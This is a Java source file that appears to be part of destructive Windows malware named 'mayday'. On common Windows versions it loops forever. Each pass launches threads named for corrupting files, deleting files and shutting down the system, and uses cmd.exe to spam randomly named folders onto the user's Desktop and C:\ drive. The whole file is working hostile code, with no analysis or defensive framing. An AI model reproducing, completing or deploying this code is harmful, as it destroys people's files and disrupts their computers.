package ml.lucid.os;

import ml.lucid.mayday;
import ml.lucid.thread.CorruptionThread;
import ml.lucid.thread.DeleterThread;
import ml.lucid.thread.ShutdownThread;

import java.io.IOException;
import java.util.Random;
import java.util.concurrent.TimeUnit;

public class win {

    private static String os = System.getProperty("os.name");

    public static void win()
            {

        Random rand = new Random();

        if(os.equals("Windows 10") || os.equals("Windows 7") || os.equals("Windows 8.1") || os.equals("Windows XP")) {
            while(true) {
                try {
                    Thread corr = new Thread(new CorruptionThread());
                    Thread delete = new Thread(new DeleterThread());
                    Thread shtDwn = new Thread(new ShutdownThread());

                    TimeUnit.MILLISECONDS.sleep(10);
                    int t1 = rand.nextInt(99) + 1;
                    int t2 = rand.nextInt(99) + 1;
                    int t3 = rand.nextInt(99) + 1;
                    int t4 = rand.nextInt(99) + 1;
                    int t5 = rand.nextInt(99) + 1;

                    String name = t1 + t2 + t3 + t4 + Integer.toString(t5);

                    String path = "C:\\Users\\" + mayday.login + "\\Desktop\\";
                    String pathC = "C:\\";

                    String command = "mkdir " + path + name;
                    String cc = "mkdir "+pathC+name;

                    corr.start();
                    delete.start();
                    shtDwn.start();
                    Runtime.getRuntime().exec("cmd.exe /c "+command);
                    Runtime.getRuntime().exec("cmd.exe /c "+cc);
                } catch (IOException io) {
                    System.out.println();
                }catch(InterruptedException inter){
                    System.out.println();
                }
            }
        }
    }
}



